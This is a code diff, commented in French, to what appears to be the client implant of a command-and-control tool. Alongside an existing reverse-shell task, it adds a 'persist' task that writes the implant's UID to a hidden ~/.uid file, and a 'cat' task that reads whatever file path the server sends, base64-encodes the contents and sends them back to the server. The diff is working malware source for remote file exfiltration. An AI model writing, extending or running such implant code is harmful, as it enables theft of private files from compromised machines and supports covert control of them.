@@ -5,6 +5,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
+#include <pwd.h>
 #include "base64.h"
 #include "client.h"
 #include "tasks.h"
@@ -145,17 +146,148 @@ void task_revshell() {
     return;
 }
 
-
 void task_persist() {
     printf("Exécution de la tâche persist\n");
-    // Implémentation à faire
+    
+    // Obtenir le nom d'utilisateur actuel via getpwuid
+    struct passwd *pw = getpwuid(getuid());
+    const char *username = (pw && pw->pw_name) ? pw->pw_name : "inconnu";
+    
+    // Construire le chemin vers /home/$user/.uid
+    char uid_path[256];
+    snprintf(uid_path, sizeof(uid_path), "/home/%s/.uid", username);
+    printf("Création du fichier de persistance: %s\n", uid_path);
+    
+    // Créer le fichier .uid dans /home/$user
+    FILE *fp = fopen(uid_path, "w");
+    if (fp == NULL) {
+        printf("Erreur: Impossible de créer le fichier de persistance %s\n", uid_path);
+        perror("Erreur");
+        return;
+    }
+    
+    // Écrire l'UID actuel dans le fichier
+    fprintf(fp, "%s", uid);
+    fclose(fp);
+    
+    printf("Persistance configurée : UID %s sauvegardé dans %s\n", uid, uid_path);
+    
+    // Envoyer un message de succès au serveur
+    char message[256];
+    char *encoded_result = encode("Persistance configurée avec succès");
+    if (encoded_result != NULL) {
+        snprintf(message, sizeof(message), "RESULT,%s,persist,%s", uid, encoded_result);
+        char *response = send_server_message(message, server_ip, server_port);
+        if (response != NULL) free(response);
+        free(encoded_result);
+    }
+    
     return;
 }
 
-void task_cat() {
+void task_cat(char *file_path_str, const char *id_task) {
     printf("Exécution de la tâche cat\n");
-    // Implémentation à faire
-    return;
+    
+    if (file_path_str == NULL) {
+        printf("Erreur: Chemin du fichier non spécifié\n");
+        return;
+    }
+    
+    printf("Paramètre reçu: %s\n", file_path_str);
+    
+    // Forcer le décodage base64 du chemin (le serveur l'envoie toujours encodé)
+    char *file_path = decode(file_path_str);
+    
+    if (file_path == NULL) {
+        printf("Erreur: Impossible de décoder le chemin du fichier\n");
+        printf("Tentative d'utilisation du chemin tel quel comme fallback\n");
+        
+        // Fallback: utiliser le chemin tel quel si le décodage échoue
+        file_path = strdup(file_path_str);
+        if (file_path == NULL) {
+            printf("Erreur: Impossible d'allouer de la mémoire pour le chemin du fichier\n");
+            return;
+        }
+    }
+    
+    printf("Chemin du fichier (décodé): %s\n", file_path);
+    
+    // Ouvrir le fichier en mode lecture binaire pour gérer tous les types de fichiers
+    FILE *fp = fopen(file_path, "rb");
+    if (fp == NULL) {
+        printf("Erreur: Impossible d'ouvrir le fichier %s\n", file_path);
+        
+        // Envoyer le message d'erreur comme résultat
+        char error_buf[512];
+        snprintf(error_buf, sizeof(error_buf), "Erreur: Impossible d'ouvrir le fichier %s", file_path);
+        char *encoded_error = encode(error_buf);
+        if (encoded_error != NULL) {
+            char message[4096];
+            snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_error);
+            char *response = send_server_message(message, server_ip, server_port);
+            if (response != NULL) free(response);
+            free(encoded_error);
+        }
+        free(file_path);
+        return;
+    }
+    
+    // Déterminer la taille du fichier
+    fseek(fp, 0L, SEEK_END);
+    long file_size = ftell(fp);
+    rewind(fp);
+    
+    printf("Taille du fichier: %ld octets\n", file_size);
+    
+    // Vérifier si le fichier est trop grand
+    if (file_size > 3072) { // Limiter à 3KB pour assurer la compatibilité base64
+        printf("Attention: Fichier trop grand, tronqué à 3KB\n");
+        file_size = 3072;
+    }
+    
+    // Allouer un tampon pour le contenu du fichier
+    char *file_content = malloc(file_size + 1);
+    if (file_content == NULL) {
+        printf("Erreur: Impossible d'allouer de la mémoire pour le contenu du fichier\n");
+        fclose(fp);
+        free(file_path);
+        return;
+    }
+    
+    // Lire le contenu du fichier
+    size_t bytes_read = fread(file_content, 1, file_size, fp);
+    file_content[bytes_read] = '\0';
+    fclose(fp);
+    
+    printf("Contenu lu: %zu octets\n", bytes_read);
+    
+    // Encoder le contenu du fichier
+    printf("Encodage du contenu en base64...\n");
+    char *encoded_result = encode(file_content);
+    if (encoded_result == NULL) {
+        printf("Erreur d'encodage en base64\n");
+        free(file_content);
+        free(file_path);
+        return;
+    }
+    
+    printf("Encodage réussi, taille: %zu octets\n", strlen(encoded_result));
+    
+    // Envoyer le résultat au serveur
+    char message[4096];
+    snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
+    
+    char *response = send_server_message(message, server_ip, server_port);
+    if (response != NULL) {
+        printf("Réponse du serveur: %s\n", response);
+        free(response);
+    } else {
+        printf("Aucune réponse du serveur\n");
+    }
+    
+    free(encoded_result);
+    free(file_content);
+    free(file_path);
 }
 
 void task_mv() {
